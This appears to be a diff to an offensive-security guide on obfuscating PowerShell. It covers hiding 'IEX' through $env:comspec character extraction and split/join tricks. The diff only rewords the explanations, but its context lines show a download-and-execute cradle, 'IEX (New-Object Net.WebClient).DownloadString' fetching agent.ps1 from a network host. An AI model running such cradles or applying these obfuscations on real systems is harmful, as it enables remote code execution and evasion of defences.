@@ -338,8 +338,10 @@ The above string can be obfuscated using **powershell special characters:** **`*
 
 ---
 
-- Using **$env:comspec** (windows environment variable) and **-Join ''** to pull out the 4º ,15º and 25º characters<br />
-from $env:comspec variable and use the **-Join ''** operator to take the array and convert it to a string.
+      Using $env:comspec (windows environment variable) and -Join '' to pull out the 4º ,15º and 25º characters
+      from $env:comspec variable and then the -Join '' operator will take the array and convert it to a string.
+
+<br />
 
 - String command to obfuscate<br />
 `IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')`
@@ -351,7 +353,9 @@ from $env:comspec variable and use the **-Join ''** operator to take the array a
 
 ---
 
-- Using an powershell variable (**$cmdWithDelim**) to **split** the system call and then **-Join ''** it back again
+      Using an powershell variable ($cmdWithDelim) to 'de-split' the system call and then -Join '' it back again.
+
+<br />
 
 - String command to obfuscate<br />
 `(New-Object Net.WebClient).DownloadString('http://192.168.1.71/agent.ps1')`
